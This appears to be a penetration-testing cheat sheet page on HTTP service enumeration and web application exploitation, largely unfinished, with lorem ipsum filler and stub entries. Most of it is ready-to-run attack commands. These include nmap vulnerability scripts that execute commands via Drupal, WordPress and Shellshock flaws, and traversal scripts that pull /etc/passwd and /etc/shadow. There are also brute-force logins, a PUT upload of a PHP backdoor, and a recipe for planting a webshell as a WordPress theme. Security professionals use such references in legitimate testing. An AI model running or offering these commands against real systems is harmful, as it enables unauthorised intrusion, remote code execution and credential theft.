---
description: >-
  Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor
  incididunt ut labore et dolore magna aliqua.
---

# HTTP/S

**HTTP Service Scan and Enumeration**

> Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum

{% hint style="info" %}
Applications for locating web services
{% endhint %}

### Nmap

```text
﻿nmap -sSV -P0 -p"http*" --script http-enum <HOST(S)> -oG <HOST(S)>-http-scan.txt
```

### **Unicornscan**

```text
unicornscan something something
```

### **Nikto**

```text
﻿nikto -host <HOST(S)>
```

```text
nikto -host <HOST(S)> -port 8000
```

### **Snallygaster**

```text
snallygaster http://10.1.1.1
```

### **WFuzz**

```text
wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/common.txt --hc 404 http://10.1.1.1/FUZZ
```

### **DirBuster**

```text
java -jar DirBuster-1.0-RC1.jar -H -u https://10.1.1.1
```

```text
java -jar DirBuster-1.0-RC1.jar -u https://10.1.1.1
```

### **Dirb**

```text
dirb http://10.1.1.1 /usr/share/wordlists/dirb/common.txt
```

### Additional Nmap Scripts

**HTTP Recon \(Not as good as Nikto\)** `nmap --script http-enum <target>`  
**HTTP Title** `nmap --script http-title -sV -p http 192.168.1.0/24`  
**HTTP Site Map Generator** `nmap --script http-sitemap-generator -p 80 <target>`  
**HTTP Methods** `nmap --script http-methods -p 80 <target>`  
**Known Bad SSL Keys** `nmap --script ssl-known-key -p 443 <host>`  
**HTTP Form Brute Auth** `nmap --script http-form-brute -p 80 <host>`  
**HTTP Basic brute** `nmap --script http-brute -p 80 <host>`  
**Proxy Server Broadcast Discovery** `nmap --script broadcast-wpad-discover`  
**HTTP Proxy Brute** `nmap --script http-proxy-brute -p 8080 <host>`  
**Socks Brute** `nmap --script socks-brute -p 1080 <host>`  
**SSL ROCA Weak keys** `nmap -p 22,443 --script rsa-vuln-roca <target>`

**HTTP File Upload Check**

```text
nmap -p80 --script http-fileupload-exploiter.nse uploadspaths={'/webdav', ‘xampp’} <target>
```

```text
nmap -p 80  --script http-put --script-args http-put.url='/usr/share/webshells/php/simple-backdoor.php',http-put.file='/webdav/rootme.php <target>
```

**Heartbleed Testing**

```text
nmap -sV -p 443 --script=ssl-heartbleed 192.168.1.0/24
```

**Check for GIT Files**

```text
nmap -sV -sC <target>
```

**IIS WEB DAV**

```text
nmap --script http-iis-webdav-vuln -p80,8080 <target>
```

**Directory Traversal**

```text
nmap --script http-passwd --script-args http-passwd.root=/test/ <target>
```

**ShellShock Check**

```text
nmap -sV -p- --script http-shellshock --script-args uri=/cgi-bin/bin,cmd=ls <target>
```

**Cold fusion Admin Cookie**

```text
nmap -sV --script http-adobe-coldfusion-apsa1301 <target>
```

**Cold fusion Admin Cookie exmaple directory**

```text
 nmap -p80 --script http-adobe-coldfusion-apsa1301 --script-args basepath=/cf/adminapi/ <target>
```

**Cold Fusion Dir Traversal**

```text
nmap --script http-vuln-cve2010-2861 <host>
```

**ASP .NET Debug check**

```text
 nmap --script http-aspnet-debug --script-args http-aspnet-debug.path=/path <target>
```

**JSON Rest Endpoint Finder**

```text
nmap -p 80 --script http-jsonp-detection <target>
```

**PHPMyAdmin Dir Traversal**

```text
nmap -p80 --script http-phpmyadmin-dir-traversal --script-args="dir='/pma/',file='../../../../../../../../etc/passwd',outfile='passwd.txt'" <target>
```

```text
nmap -p80 --script http-phpmyadmin-dir-traversal <host/ip>
```

**Webmin Check**

```text
nmap -sV --script http-vuln-cve2006-3392 <target>
```

```text
nmap -p80 --script http-vuln-cve2006-3392 --script-args http-vuln-cve2006-3392.file=/etc/shadow <target>
```

**PHP CGI Check**

```text
nmap -sV --script http-vuln-cve2012-1823 <target>
```

```text
nmap -p80 --script http-vuln-cve2012-1823 --script-args http-vuln-cve2012-1823.uri=/test.php <target>
```

**Drupal 'Drupageddon' &lt; 7.32**

```text
nmap --script http-vuln-cve2014-3704 --script-args http-vuln-cve2014-3704.cmd="uname -a",http-vuln-cve2014-3704.uri="/drupal" <target>
```

```text
nmap --script http-vuln-cve2014-3704 --script-args http-vuln-cve2014-3704.uri="/drupal",http-vuln-cve2014-3704.cleanup=false <target>
```

**Wordpress Download Manager**

```text
nmap --script http-vuln-cve2014-8877 --script-args http-vuln-cve2014-8877.cmd="whoami",http-vuln-cve2014-8877.uri="/wordpress" <target>
```

```text
nmap --script http-vuln-cve2014-8877 <target>
```

**WordPress REST API 4.7.0 and 4.7.1**

```text
nmap --script http-vuln-cve2017-1001000 --script-args http-vuln-cve2017-1001000="uri" <target>
```

```text
nmap --script http-vuln-cve2017-1001000 <target>
```

**Wordpress Usernames Enumeration**

```text
nmap -p80 --script http-wordpress-users <target>
```

```text
nmap -sV --script http-wordpress-users --script-args limit=50 <target>
```

**WordPress Brute**

```text
nmap -sV --script http-wordpress-brute <target>
```

```text
nmap -sV --script http-wordpress-brute--script-args 'userdb=users.txt,passdb=passwds.txt,http-wordpress-brute.hostname=domain.com,http-wordpress-brute.threads=3,brute.firstonly=true' <target>
```

**Intel Active Mangement**

```text
 nmap -p 16992 --script http-vuln-cve2017-5689 <target>
```

**Joomla! 3.7.x SQLI**

```text
nmap --script http-vuln-cve2017-8917 -p 80 <target>
```

```text
nmap --script http-vuln-cve2017-8917 --script-args http-vuln-cve2017-8917.uri=joomla/ -p 80<target>
```

## Exploiting HTTP Services and Web Applications

{% tabs %}
{% tab title="Apache" %}
**Apache Local Directories:**  
[https://wiki.apache.org/httpd/DistrosDefaultLayout](https://wiki.apache.org/httpd/DistrosDefaultLayout)  
  
**List Apache Modules**  
Apache -M  
  
**Apache Reverse Proxy Check**  
 nmap --script http-vuln-cve2011-3368 &lt;targets&gt;  
**Apache Struts RCE**  
 nmap -p &lt;port&gt; --script http-vuln-cve2017-5638 &lt;target&gt;  
**Apache JServ brute**  
 nmap -p 8009 --script ajp-brute &lt;target&gt;  
**Enumerate Apache Users**  
apache-users -h 192.1.1.1 -l /usr/share/wordlists/metasploit/unix\_users.txt -p 80 -s 0 -e 403 -t 10
{% endtab %}

{% tab title="IIS" %}
**ASP .NET Debug check**  
 nmap --script http-aspnet-debug --script-args http-aspnet-debug.path=/path &lt;target&gt;  
**IIS WEB DAV**  
 nmap --script http-iis-webdav-vuln -p80,8080 &lt;target&gt;
{% endtab %}
{% endtabs %}

{% tabs %}
{% tab title="WordPress" %}
**WordPress default database configuration filename**  
&lt;web-app-path&gt;  
**WordPress default login page**  
&lt;web-app-path&gt;/wp-login.php  
**WordPress plugins**  
&lt;web-app-path&gt;/wp-content/plugins  
**Scanning WordPress for plugins and versions**  
/pentest/web/wpscan/wpscan.rb --url &lt;target-and-wordpress-path&gt; --proxy &lt;proxy-addr:port&gt; -enumerate \[u\|p\|v\|t\]   
/pentest/enumeration/web/cms-explorer  -url &lt;target-and-wordpress-path&gt; -type wordpress  
**Newer WP: "Themes" can be uploaded as zip files by WP administrators i.e. you:**  
mkdir wpx  
vi wpx/cmd.php  
cat wpx/cmd.php  
&lt;?php system\($\_GET\['cmd'\]\) ?&gt;  
zip -r wpx.zip wpx  
**upload wpx.zip via web interface as an installed theme**  
**Command execution access is via:**   
&lt;web-app-path&gt;/wp-content/plugins/wpx/cmd.php?cmd=&lt;command\(s\)&gt;   
Older WP: Webshells can be added by editing exiting files/themes via the web interface or by enabling file upload and permitting the valid file extension \(e.g. .php\)
{% endtab %}

{% tab title="Joomla" %}
**Joomla default database configuration filename**  
&lt;web-app-path&gt;/configuration.php  
**Scanning Joomla! for plugins and versions**  
/pentest/web/scanners/joomscan/joomscan.pl -u &lt;target-and-joomla-path&gt;  
/pentest/enumeration/web/cms-explorer  -url &lt;target-and-joomla-path&gt; -type joomla
{% endtab %}

{% tab title="Other" %}
**Cacti**  
**Cacti default database configuration filename**  
&lt;web-app-path&gt;/include/config.php  
  
  
**DeV!L\`z ClanPortal**  
**DeV!L\`z ClanPortal default database configuration filename**  
&lt;web-app-path&gt;/inc/mysql.php  
  
**Drupal  
Drupal default database configuration filename**  
&lt;web-app-path&gt;/sites/default/settings.php  
  
**Scanning Drupal for plugins and versions**  
/pentest/enumeration/web/cms-explorer  -url &lt;target-and-drupal-path&gt; -type drupal  
PHPMyAdmin/phpmyadmin/changelog.php  
  
**TimeclockTimeclock**  
default database configuration filename&lt;web-app-path&gt;/db.php
{% endtab %}
{% endtabs %}

### LFISuite

### fimap

### SQLMap

{% hint style="info" %}
Additional information for SQLMap can be found [here.](https://bloodshot.gitbook.io/manual/tools/burp-suite)
{% endhint %}



